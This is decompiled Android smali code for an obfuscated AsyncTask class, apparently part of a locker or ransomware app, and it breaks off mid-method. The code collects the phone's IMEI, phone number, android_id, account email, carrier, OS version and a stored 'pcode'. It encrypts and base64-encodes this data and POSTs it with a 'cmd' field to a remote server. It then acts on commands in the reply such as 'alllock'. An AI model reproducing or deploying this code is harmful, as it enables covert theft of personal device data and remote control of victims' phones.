.class Lmzmr/iiyma/ssrxp/Pvyoevmw;
.super Landroid/os/AsyncTask;
.source "Pvyoevmw.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field private mContext:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 44
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 45
    iput-object p1, p0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    .line 48
    return-void
.end method

.method private capitalize(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "s"    # Ljava/lang/String;

    .prologue
    .line 61
    if-eqz p1, :cond_0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    if-nez v1, :cond_2

    .line 62
    :cond_0
    const-string p1, ""

    .line 68
    .end local p1    # "s":Ljava/lang/String;
    :cond_1
    :goto_0
    return-object p1

    .line 64
    .restart local p1    # "s":Ljava/lang/String;
    :cond_2
    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    .line 65
    .local v0, "first":C
    invoke-static {v0}, Ljava/lang/Character;->isUpperCase(C)Z

    move-result v1

    if-nez v1, :cond_1

    .line 68
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/Character;->toUpperCase(C)C

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {p1, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_0
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lmzmr/iiyma/ssrxp/Pvyoevmw;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 42
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    .line 78
    :try_start_0
    new-instance v19, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct/range {v19 .. v19}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 79
    .local v19, "hc":Lorg/apache/http/impl/client/DefaultHttpClient;
    new-instance v29, Lorg/apache/http/impl/client/BasicResponseHandler;

    invoke-direct/range {v29 .. v29}, Lorg/apache/http/impl/client/BasicResponseHandler;-><init>()V

    .line 81
    .local v29, "res":Lorg/apache/http/client/ResponseHandler;, "Lorg/apache/http/client/ResponseHandler<Ljava/lang/String;>;"
    new-instance v28, Lorg/apache/http/client/methods/HttpPost;

    const/16 v37, 0x0

    aget-object v37, p1, v37

    move-object/from16 v0, v28

    move-object/from16 v1, v37

    invoke-direct {v0, v1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 83
    .local v28, "postMethod":Lorg/apache/http/client/methods/HttpPost;
    new-instance v25, Ljava/util/ArrayList;

    const/16 v37, 0x2

    move-object/from16 v0, v25

    move/from16 v1, v37

    invoke-direct {v0, v1}, Ljava/util/ArrayList;-><init>(I)V

    .line 86
    .local v25, "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    const-string v36, "n/a"

    .line 87
    .local v36, "typenet":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v38, "connectivity"

    invoke-virtual/range {v37 .. v38}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/net/ConnectivityManager;

    .line 88
    .local v9, "cm":Landroid/net/ConnectivityManager;
    invoke-virtual {v9}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v5

    .line 90
    .local v5, "activeNetwork":Landroid/net/NetworkInfo;
    invoke-virtual {v5}, Landroid/net/NetworkInfo;->getType()I

    move-result v37

    if-nez v37, :cond_9

    const/16 v21, 0x1

    .line 91
    .local v21, "isMobile":Z
    :goto_0
    const/16 v37, 0x1

    move/from16 v0, v37

    invoke-virtual {v9, v0}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v37

    .line 92
    invoke-virtual/range {v37 .. v37}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v22

    .line 93
    .local v22, "isWifi":Z
    if-eqz v21, :cond_0

    .line 94
    const-string v36, "mobile"

    .line 96
    :cond_0
    if-eqz v22, :cond_1

    .line 97
    const-string v36, "wifi"

    .line 99
    :cond_1
    const-string v17, ""

    .line 100
    .local v17, "email":Ljava/lang/String;
    sget-object v18, Landroid/util/Patterns;->EMAIL_ADDRESS:Ljava/util/regex/Pattern;

    .line 101
    .local v18, "emailPattern":Ljava/util/regex/Pattern;
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    invoke-static/range {v37 .. v37}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Landroid/accounts/AccountManager;->getAccounts()[Landroid/accounts/Account;

    move-result-object v4

    .line 102
    .local v4, "accounts":[Landroid/accounts/Account;
    array-length v0, v4

    move/from16 v38, v0

    const/16 v37, 0x0

    :goto_1
    move/from16 v0, v37

    move/from16 v1, v38

    if-lt v0, v1, :cond_a

    .line 108
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v38, "cocon"

    const/16 v39, 0x0

    invoke-virtual/range {v37 .. v39}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v33

    .line 109
    .local v33, "settings3":Landroid/content/SharedPreferences;
    const-string v37, "status"

    const/16 v38, 0x0

    move-object/from16 v0, v33

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v34

    .line 110
    .local v34, "status":I
    const-string v37, "camera"

    const/16 v38, 0x0

    move-object/from16 v0, v33

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v8

    .line 111
    .local v8, "camera":I
    const-string v37, "pcode"

    const-string v38, "null"

    move-object/from16 v0, v33

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 112
    .local v10, "code":Ljava/lang/String;
    const-string v11, ""

    .line 113
    .local v11, "data":Ljava/lang/String;
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v38, v0

    invoke-virtual/range {v38 .. v38}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v38

    const-string v39, "android_id"

    invoke-static/range {v38 .. v39}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 114
    new-instance v38, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v38

    move-object/from16 v1, v37

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v39, "phone"

    move-object/from16 v0, v37

    move-object/from16 v1, v39

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v37

    check-cast v37, Landroid/telephony/TelephonyManager;

    invoke-virtual/range {v37 .. v37}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v38

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 115
    new-instance v38, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v38

    move-object/from16 v1, v37

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v39, "phone"

    move-object/from16 v0, v37

    move-object/from16 v1, v39

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v37

    check-cast v37, Landroid/telephony/TelephonyManager;

    invoke-virtual/range {v37 .. v37}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v38

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 116
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {p0 .. p0}, Lmzmr/iiyma/ssrxp/Pvyoevmw;->getDeviceName()Ljava/lang/String;

    move-result-object v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 117
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v38, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 118
    new-instance v38, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v38

    move-object/from16 v1, v37

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v39, "phone"

    move-object/from16 v0, v37

    move-object/from16 v1, v39

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v37

    check-cast v37, Landroid/telephony/TelephonyManager;

    invoke-virtual/range {v37 .. v37}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v38

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 119
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    move-object/from16 v1, v36

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 120
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 121
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v38, v0

    invoke-virtual/range {v38 .. v38}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v38

    move-object/from16 v0, v38

    iget-object v0, v0, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    move-object/from16 v38, v0

    invoke-virtual/range {v38 .. v38}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 122
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static/range {v34 .. v34}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 123
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v8}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 124
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ":-:"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 125
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v38

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v38, 0x2

    aget-object v38, p1, v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 126
    new-instance v24, Lmzmr/iiyma/ssrxp/Ydoqnsryb;

    invoke-direct/range {v24 .. v24}, Lmzmr/iiyma/ssrxp/Ydoqnsryb;-><init>()V

    .line 127
    .local v24, "mcrypt":Lmzmr/iiyma/ssrxp/Ydoqnsryb;
    move-object/from16 v0, v24

    invoke-virtual {v0, v11}, Lmzmr/iiyma/ssrxp/Ydoqnsryb;->encrypt(Ljava/lang/String;)[B

    move-result-object v37

    invoke-static/range {v37 .. v37}, Lmzmr/iiyma/ssrxp/Ydoqnsryb;->bytesToHex([B)Ljava/lang/String;

    move-result-object v12

    .line 128
    .local v12, "data2":Ljava/lang/String;
    const-string v7, ""
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 129
    .local v7, "base64":Ljava/lang/String;
    const/4 v13, 0x0

    .line 131
    .local v13, "data3":[B
    :try_start_1
    const-string v37, "UTF-8"

    move-object/from16 v0, v37

    invoke-virtual {v12, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v13

    .line 135
    :goto_2
    const/16 v37, 0x0

    :try_start_2
    move/from16 v0, v37

    invoke-static {v13, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    move-result-object v7

    .line 137
    const/16 v23, 0x15

    .line 139
    .local v23, "key":I
    :try_start_3
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    invoke-virtual/range {v37 .. v37}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v37

    .line 140
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v38, v0

    invoke-virtual/range {v38 .. v38}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v38

    const/16 v39, 0x80

    .line 139
    invoke-virtual/range {v37 .. v39}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v6

    .line 141
    .local v6, "appInfo":Landroid/content/pm/ApplicationInfo;
    iget-object v0, v6, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    move-object/from16 v37, v0

    if-eqz v37, :cond_2

    .line 142
    iget-object v0, v6, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    move-object/from16 v37, v0

    const-string v38, "sub"

    invoke-virtual/range {v37 .. v38}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I
    :try_end_3
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    move-result v23

    .line 149
    .end local v6    # "appInfo":Landroid/content/pm/ApplicationInfo;
    :cond_2
    :goto_3
    :try_start_4
    new-instance v38, Lorg/apache/http/message/BasicNameValuePair;

    const-string v39, "imei"

    new-instance v40, Ljava/lang/StringBuilder;

    const-string v37, "#"

    move-object/from16 v0, v40

    move-object/from16 v1, v37

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v41, "phone"

    move-object/from16 v0, v37

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v37

    check-cast v37, Landroid/telephony/TelephonyManager;

    invoke-virtual/range {v37 .. v37}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v40

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v38

    move-object/from16 v1, v39

    move-object/from16 v2, v37

    invoke-direct {v0, v1, v2}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v25

    move-object/from16 v1, v38

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 150
    new-instance v37, Lorg/apache/http/message/BasicNameValuePair;

    const-string v38, "cmd"

    const/16 v39, 0x1

    aget-object v39, p1, v39

    invoke-direct/range {v37 .. v39}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v25

    move-object/from16 v1, v37

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 151
    new-instance v37, Lorg/apache/http/message/BasicNameValuePair;

    const-string v38, "sub"

    invoke-static/range {v23 .. v23}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v39

    invoke-direct/range {v37 .. v39}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v25

    move-object/from16 v1, v37

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 152
    new-instance v37, Lorg/apache/http/message/BasicNameValuePair;

    const-string v38, "data"

    move-object/from16 v0, v37

    move-object/from16 v1, v38

    invoke-direct {v0, v1, v7}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v25

    move-object/from16 v1, v37

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 154
    new-instance v37, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    move-object/from16 v0, v37

    move-object/from16 v1, v25

    invoke-direct {v0, v1}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    move-object/from16 v0, v28

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 156
    move-object/from16 v0, v19

    move-object/from16 v1, v28

    move-object/from16 v2, v29

    invoke-virtual {v0, v1, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;Lorg/apache/http/client/ResponseHandler;)Ljava/lang/Object;

    move-result-object v30

    check-cast v30, Ljava/lang/String;

    .line 157
    .local v30, "response":Ljava/lang/String;
    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->length()I

    move-result v37

    const/16 v38, 0x3

    move/from16 v0, v37

    move/from16 v1, v38

    if-le v0, v1, :cond_8

    .line 160
    const-string v37, "alllock"

    move-object/from16 v0, v30

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v37

    if-eqz v37, :cond_3

    .line 162
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v38, "cocon"

    const/16 v39, 0x0

    invoke-virtual/range {v37 .. v39}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v31

    .line 163
    .local v31, "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v31 .. v31}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v16

    .line 164
    .local v16, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v37, "status"

    const/16 v38, 0x0

    move-object/from16 v0, v16

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 165
    const-string v37, "animation"

    const/16 v38, 0x0

    move-object/from16 v0, v16

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 166
    const-string v37, "pcode"

    const-string v38, ""

    move-object/from16 v0, v16

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 167
    invoke-interface/range {v16 .. v16}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 168
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    new-instance v38, Landroid/content/Intent;
